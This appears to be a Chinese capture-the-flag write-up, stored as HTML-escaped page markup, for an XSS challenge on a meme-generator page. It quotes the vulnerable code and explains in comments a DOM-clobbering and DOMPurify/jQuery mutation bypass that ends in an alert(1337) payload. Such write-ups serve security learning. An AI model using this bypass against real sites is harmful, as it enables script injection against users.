&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4NzU4NTQ4MzQtY2RiMDQyYjAtMTUwYS00ZmIzLWIyM2UtMmFlMmI5Zjk5ZTU1Lm1k&#34;&gt;📎World War 3.md&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;Meme Code&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h4&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;textarea&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;class&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;form-control&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;meme-code&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;rows&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;textarea&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;notify&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    /* Utils */&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    const escape = (dirty) =&amp;gt; unescape(dirty).replace(/[&lt;span class=&#34;tag&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&amp;#x27;&amp;quot;=]/g, &amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    const memeTemplate = (img, text) =&amp;gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        return (`&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;@import&lt;/span&gt; url(&lt;span class=&#34;string&#34;&gt;&amp;#x27;https://fonts.googleapis.com/css?family=Oswald:700&amp;amp;display=swap&amp;#x27;&lt;/span&gt;);`+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            `&lt;span class=&#34;selector-class&#34;&gt;.meme-card&lt;/span&gt;&amp;#123;&lt;span class=&#34;attribute&#34;&gt;margin&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; auto;&lt;span class=&#34;attribute&#34;&gt;width&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;300px&lt;/span&gt;&amp;#125;&lt;span class=&#34;selector-class&#34;&gt;.meme-card&lt;/span&gt;&amp;gt;&lt;span class=&#34;selector-tag&#34;&gt;img&lt;/span&gt;&amp;#123;&lt;span class=&#34;attribute&#34;&gt;width&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;300px&lt;/span&gt;&amp;#125;`+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            `&lt;span class=&#34;selector-class&#34;&gt;.meme-card&lt;/span&gt;&amp;gt;&lt;span class=&#34;selector-tag&#34;&gt;h1&lt;/span&gt;&amp;#123;&lt;span class=&#34;attribute&#34;&gt;text-align&lt;/span&gt;:center;&lt;span class=&#34;attribute&#34;&gt;color&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;#fff&lt;/span&gt;;&lt;span class=&#34;attribute&#34;&gt;background&lt;/span&gt;:black;&lt;span class=&#34;attribute&#34;&gt;margin-top&lt;/span&gt;:-&lt;span class=&#34;number&#34;&gt;5px&lt;/span&gt;;`+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-css&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            `&lt;span class=&#34;attribute&#34;&gt;position&lt;/span&gt;:relative;&lt;span class=&#34;attribute&#34;&gt;font-family&lt;/span&gt;:Oswald,sans-serif;&lt;span class=&#34;attribute&#34;&gt;font-weight&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;700&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;`+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            `&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;class&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;meme-card&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;$&amp;#123;img&amp;#125;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;$&amp;#123;text&amp;#125;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;`)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    const memeGen = (that, notify) =&amp;gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        if (text &amp;amp;&amp;amp; img) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            template = memeTemplate(img, text)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            if (notify) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;                html = (`&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;class&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert alert-warning&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;role&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;b&lt;/span&gt;&amp;gt;&lt;/span&gt;Meme&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;b&lt;/span&gt;&amp;gt;&lt;/span&gt; created from $&amp;#123;DOMPurify.sanitize(text)&amp;#125;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;`)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            setTimeout(_ =&amp;gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;                $(&amp;#x27;#status&amp;#x27;).remove()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;                notify ? ($(&amp;#x27;#notify&amp;#x27;).html(html)) : &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;                $(&amp;#x27;#meme-code&amp;#x27;).text(template)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;            &amp;#125;, 1000)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Main */&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; notify = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; text = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;URL&lt;/span&gt;(location).&lt;span class=&#34;property&#34;&gt;searchParams&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;text&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;let&lt;/span&gt; img = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;URL&lt;/span&gt;(location).&lt;span class=&#34;property&#34;&gt;searchParams&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (text &amp;amp;&amp;amp; img) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;write&lt;/span&gt;(&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;            &lt;span class=&#34;string&#34;&gt;`&amp;lt;div class=&amp;quot;alert alert-primary&amp;quot; role=&amp;quot;alert&amp;quot; id=&amp;quot;status&amp;quot;&amp;gt;`&lt;/span&gt;+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;            &lt;span class=&#34;string&#34;&gt;`&amp;lt;img class=&amp;quot;circle&amp;quot; src=&amp;quot;&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;built_in&#34;&gt;escape&lt;/span&gt;(img)&amp;#125;&lt;/span&gt;&amp;quot; onload=&amp;quot;memeGen(this, notify)&amp;quot;&amp;gt;`&lt;/span&gt;+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;            &lt;span class=&#34;string&#34;&gt;`Creating meme... (&lt;span class=&#34;subst&#34;&gt;$&amp;#123;DOMPurify.sanitize(text)&amp;#125;&lt;/span&gt;)&amp;lt;/div&amp;gt;`&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        )&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        $(&lt;span class=&#34;string&#34;&gt;&amp;#x27;#meme-code&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;text&lt;/span&gt;(&lt;span class=&#34;title function_&#34;&gt;memeTemplate&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;https://i.imgur.com/PdbDexI.jpg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;When you get that WW3 draft letter&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//代码分析，Utils中为函数声明，main中调用了Utils中的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//img和text都被escape或者DOMPurify过滤，无法利用这两个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//只要text和img为真，会调用memeGen,memeGen会调用memeTemplate，memeTemplate将img和text写入Meme code中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//memeGen只有SetTimeout中notify存在利用点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//当img和text都为真时，会调用memeTemplate，在meme-code中写入该内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//memeTemplate存在可控变量img和text，但img在src中，并且存在escape函数，无法闭合，只能利用text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//text需要传入两个值：第一个是为了执行jQuery解析而覆盖的notify，第二个是利用了第一个解析产生弹窗的代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//通过&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;notify&lt;/span&gt;&amp;gt;&lt;/span&gt;覆盖notify,通过&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;配合jQuery解析绕过domporify&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//进入dompuriy过滤的是&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;,此代码被认为合法，但过滤之后又会被jQuery解析，变为：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;style&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;//  ,style被闭合，script标签逃逸,完成弹窗   &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//第一个img必须是合法的图片才能保证img和text同时为真&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前置知识 1 jquery script 标签逃逸&lt;/p&gt;
